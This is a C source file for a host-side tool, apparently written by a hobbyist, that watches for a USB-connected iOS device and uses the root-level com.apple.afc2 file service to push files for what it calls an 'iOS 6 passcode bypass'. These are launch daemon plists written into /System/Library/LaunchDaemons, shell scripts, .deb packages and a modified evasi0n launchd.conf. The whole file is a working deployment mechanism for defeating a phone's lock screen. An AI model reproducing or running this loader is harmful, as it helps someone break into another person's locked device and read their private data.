/* Arguments Explained :)

I have chosen wierd arguements because this was coded late a night, when I honestly couldn't care less about what letter you have to press to make this software do something; so I shall explain the arguments here (or you can look at the code). 

s == Run the iOS 6 exploit, which is the most interesting
p == Run cleanup

*/
#include <CoreFoundation/CoreFoundation.h>
#include "MobileDevice.h"
#define create_data(pl) \
    CFPropertyListCreateXMLData(NULL, pl)
#define create_with_data(data, mut) \
   CFPropertyListCreateFromXMLData(NULL, data, mut, NULL)
#define alloc(x) CFAllocatorAllocate(NULL, (x), 0)
#include <stdlib.h>
#include <unistd.h>
#include "threads.h"
#include "_assert.h"
#include "output.h"
#include "afc.h"
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int six = 0;
int clean = 0;

struct conn;
typedef struct conn conn;

// Globals
CFDataRef empty_data;

ev_t ev_files_ready;

static am_device *dev;
service_conn_t ha_conn;
struct afc_connection *ha_afc;

// CoreFoundation helpers
CFDataRef read_file(const char *fn) {
    FILE *fp = fopen(fn, "rb");

    // Calculate file size
    fseek(fp, 0, SEEK_END);
    long sz = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    char *data = alloc(sz);
    _assert(sz == fread(data, 1, sz, fp));
    _assertZero(fclose(fp));
    return CFDataCreateWithBytesNoCopy(NULL, data, sz, NULL);
}

#define number_with_int(x) CFNumberCreate(NULL, kCFNumberSInt32Type, (int[]){x})
#define number_with_cfindex(x) CFNumberCreate(NULL, kCFNumberCFIndexType, (CFIndex[]){x})

#define make_array(args...) make_array_(sizeof((const void *[]){args}) / sizeof(const void *), (const void *[]){args})
void *make_array_(int num_els, const void **stuff) {
    CFMutableArrayRef ref = CFArrayCreateMutable(NULL, 0, &kCFTypeArrayCallBacks);
    while(num_els--) {
        CFArrayAppendValue(ref, *stuff++);
    }
    return ref;
}

#define make_dict(args...) make_dict_(sizeof((const void *[]){args}) / sizeof(const void *) / 2, (const void *[]){args})
void *make_dict_(int num_els, const void **stuff) {
    CFMutableDictionaryRef ref = CFDictionaryCreateMutable(NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    _assert(ref);
    while(num_els--) {
        const void *value = *stuff++;
        const void *key = *stuff++;
        CFDictionarySetValue(ref, key, value);
    }
    return ref;
}

#define receive_msg(a) receive_msg_(__func__, a)
static void receive_msg_(const char *caller, service_conn_t conn) {
    uint32_t size;

    ssize_t ret = recv((int) conn, &size, sizeof(size), 0);
    _assert(ret == sizeof(size));
    size = ntohl(size);

    void *buf = alloc(size);
    // MSG_WAITALL not supported? on windows
    char *p = buf; uint32_t br = size;
    while(br) {
        ret = recv((int) conn, p, br, 0);
        _assert(ret > 0);
        br -= ret;
        p += ret;
    }
    _assert(p - size == buf);

    CFDataRef data = CFDataCreateWithBytesNoCopy(NULL, buf, size, NULL);
    CFPropertyListRef result = create_with_data(data, kCFPropertyListImmutable);
    CFRelease(data);
    CFRelease(result);
}

service_conn_t create_dl_conn(CFStringRef service) {
    service_conn_t it;
    _assertZero(AMDeviceStartService(dev, service, &it, NULL));
    receive_msg(it);
    receive_msg(it);
    return it;
}

static void send_over(struct afc_connection *afc, const char *from, const char *to) {
    printf("\nSending Over %s\nDone \n", from);
    FILE *fp = fopen(from, "rb");
    afc_file_ref ref;

    _assertZero(AFCFileRefOpen(afc, to, 3, &ref));

    ssize_t nb = 0;
    ssize_t filesize = 0;
    char buf[65536];

// THIS MUST NOT BE REMOVED OTHERWISE THE FILES ARE BROKEN 
    while((nb = fread(buf, 1, sizeof(buf), fp)) > 0) {
        filesize += nb;
        _assertZero(AFCFileRefWrite(afc, ref, buf, nb));
    }
// THIS MUST NOT BE REMOVED OTHERWISE THE FILES ARE BROKEN 
    
    _assert(feof(fp));
    fclose(fp);
    _assertZero(AFCFileRefClose(afc, ref));
}

static void send_files_thread() {
    struct afc_connection *afc;
    service_conn_t afc_conn;
    printf("Sending files via AFC.\n");
    _assertZero(AMDeviceStartService(dev, CFSTR("com.apple.afc2"), &afc_conn, NULL)); // AFC2 gives us root access 
    _assertZero(AFCConnectionOpen(afc_conn, 0, &afc));
    
    // Exploit selection
    afc_create_directory(afc, "exploit");
     if ( six == 1) {
        printf("iOS 6 selected\n");
        send_over(afc, "exploit/com.bengerard.passcodebypass6.plist", "/System/Library/LaunchDaemons/com.bengerard.passcodebypass6.plist");
        send_over(afc, "exploit/com.bengerard.passcodebypass6reboot.plist", "/System/Library/LaunchDaemons/com.bengerard.passcodebypass6reboot.plist");
        send_over(afc, "exploit/passcodebypass6.sh", "exploit/passcodebypass6.sh"); // The main exploit
        send_over(afc, "exploit/reboot.sh", "exploit/reboot.sh"); // This is used when there is no mobilesubstrate
        send_over(afc, "exploit/mobilesubstrate_0.9.4001.deb", "exploit/mobilesubstrate_0.9.4001.deb");
        send_over(afc, "exploit/exploit.deb", "exploit/exploit.deb");
        // If its jailbroken on iOS6 then we can modify the evasi0n launchd conf file to chmod our exploit :-)
        send_over(afc,"exploit/launchd.conf","/var/evasi0n/launchd.conf");
        // I believe this uses the launchd.conf vulerability within iOS6, you can see more here: http://theiphonewiki.com/wiki/Launchd.conf_untether
        send_over(afc,"exploit/launchd_orig.conf","exploit/launchd.conf"); // Keep the original safe
        // Here I decieded to patch the evasi0n launchd rather then the system one as the evasi0n one remains the same whereas I do not know whats in the system one and I cannot modify it dynamically, I don't think...
 }
    
    if ( clean == 1 ) {
    afc_remove_all(afc, "exploit");
    }
    ev_signal(&ev_files_ready);

    AFCConnectionClose(afc);
    close(afc_conn);
    printf("Finished Sending Files\n");
    printf("Please reboot your device!\n");
    exit(0); // End this!
}


static void device_notification_callback(am_device_notification_callback_info *info, void *foo) {
    if(info->msg != ADNCI_MSG_CONNECTED) return;
    printf("Connected to the AppleMobileDevice.\n");
    AMDeviceConnect(info->dev);
    _assert(AMDeviceIsPaired(info->dev));
    _assertZero(AMDeviceValidatePairing(info->dev));
    _assertZero(AMDeviceStartSession(info->dev));
    dev = info->dev;
    ev_init(&ev_files_ready);
    create_a_thread(send_files_thread); // Call send_files_thread
}

int main(int argc, char **argv) {
// Handle arguments
char *cvalue = NULL;
int index;
int c;

opterr = 0;


while ((c = getopt (argc, argv, "spc:")) != -1)
  switch (c)
    {
    case 'o':
    printf("HEllo");
    break;
    case 's':
    six = 1;
    break;
    case 'p':
    clean =1;
    break;
    case 'c':
      cvalue = optarg;
      break;
    case '?':
    exit(0);
    break;
    default:
      exit(0);
      break;
    }
    
    printf("Now listening for devices...\n");
    empty_data = CFDataCreateWithBytesNoCopy(NULL, "", 0, kCFAllocatorNull);
    void (*add_file_descriptor)(int);

    am_device_notification *notif;
    int ret = AMDeviceNotificationSubscribe(device_notification_callback, 0, 0, NULL, &notif); // Call device_notification_callback
    CFRunLoopRun();
}


